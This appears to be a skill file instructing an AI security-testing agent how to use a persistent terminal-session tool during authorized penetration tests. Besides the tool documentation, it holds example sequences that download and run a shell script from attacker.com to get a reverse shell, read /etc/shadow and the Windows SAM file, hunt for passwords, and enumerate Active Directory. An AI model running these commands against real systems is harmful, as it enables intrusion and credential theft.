---
name: terminal-session
description: |
  Persistent terminal session management for security testing.
  Use this skill when you need an interactive shell session that maintains
  state between commands (working directory, environment variables, etc.)
  during authorized penetration testing.
version: "1.0.0"
author: "Secbot Security Team"
tags: ["terminal", "session", "shell", "interactive", "persistence"]
triggers: ["terminal_session", "interactive", "shell", "session", "persistent"]
prerequisites: ["authorized_target"]
---

# Persistent Terminal Session Guide

## Overview

This skill provides guidance on using the persistent terminal session tool for effective interactive security testing.

## Session Actions

### Open Session
```json
{
  "action": "open",
  "cwd": "C:\\Users\\target"  // optional working directory
}
```

**Purpose:** Create a new persistent terminal session

**Use Cases:**
- Start a new interactive shell
- Set initial working directory
- Initialize session for multi-command operations

### Execute Command
```json
{
  "action": "exec",
  "session_id": "abc12345",
  "command": "whoami",
  "timeout": 30
}
```

**Purpose:** Execute a command in an existing session

**Features:**
- Maintains working directory between commands
- Preserves environment variables
- Command history available (up arrow)

### Read Output
```json
{
  "action": "read",
  "session_id": "abc12345"
}
```

**Purpose:** Read current session output buffer without executing command

**Use Cases:**
- Check background process output
- View previous command results
- Monitor long-running operations

### Close Session
```json
{
  "action": "close",
  "session_id": "abc12345"
}
```

**Purpose:** Properly close and clean up terminal session

**Note:** Always close sessions when done to free resources

### List Sessions
```json
{
  "action": "list"
}
```

**Purpose:** View all active terminal sessions

**Returns:**
- Number of active sessions
- Session IDs with status
- Idle time for each session

## Practical Workflows

### 1. Basic Reconnaissance Session
```
1. action=open        # Start session
2. action=exec, command="cd /tmp && pwd"  # Navigate
3. action=exec, command="nmap -sV target"  # Run scan
4. action=exec, command="ls -la"  # Check results
5. action=close       # Clean up
```

### 2. Multi-Step Exploitation
```
1. action=open, cwd="/tmp"
2. action=exec, command="wget http://attacker.com/shell.sh"
3. action=exec, command="chmod +x shell.sh"
4. action=exec, command="./shell.sh"
5. action=read        # Check for reverse shell
```

### 3. Windows Active Directory Enum
```
1. action=open, cwd="C:\\"
2. action=exec, command="whoami /all"
3. action=exec, command="net user /domain"
4. action=exec, command="net group \"Domain Admins\" /domain"
5. action=exec, command="bloodhound-python -u user -p pass -d domain.local"
```

## Session Management Tips

### Automatic Session Selection
If only ONE active session exists, you can omit `session_id` - the tool will automatically use it.

### Idle Timeout
- Sessions auto-cleanup after 10 minutes (600s) of inactivity
- Use `action=list` to check session status
- Long operations should use higher timeout values

### Working Directory Persistence
- Windows: `cd C:\path\to\dir`
- Linux: `cd /path/to/dir`
- Use `pwd` (Linux) or `cd` (Windows) to verify location

## Environment Variables

### Windows
```cmd
# Set variable
set VAR=value

# View variable
echo %VAR%

# Persistent (current session only)
setx VAR value  # Requires new session
```

### Linux
```bash
# Set variable
export VAR=value

# View variable
echo $VAR

# Add to PATH
export PATH=$PATH:/new/path
```

## Common Security Testing Sequences

### Service Enumeration
```bash
# Linux
netstat -tulpn
ss -tulwn
ps aux | grep -E "root|apache|mysql"
```

```cmd
:: Windows
netstat -ano
tasklist /v
wmic service get name,state,startmode
```

### Credential Hunting
```bash
# Linux
cat /etc/passwd
cat /etc/shadow
find / -name "*.conf" -exec grep -l "password" {} \;
```

```cmd
:: Windows
dir /s /b *password*.txt
type C:\Windows\System32\config\SAM
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Privilege Escalation Check
```bash
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

```cmd
:: Windows
whoami /priv
net user administrator
systeminfo
```

## Troubleshooting

### Command Hangs
- Increase timeout value
- Use Ctrl+C equivalent: send empty command or check with `read`
- Session may need to be closed and reopened

### Output Truncated
- Use `read` action to get full buffer
- Buffer limited to 200KB (oldest output auto-cleared)
- Consider redirecting to file for large outputs

### Session Not Found
- Check with `action=list` to see active sessions
- Session may have timed out (10 min idle)
- Create new session with `action=open`
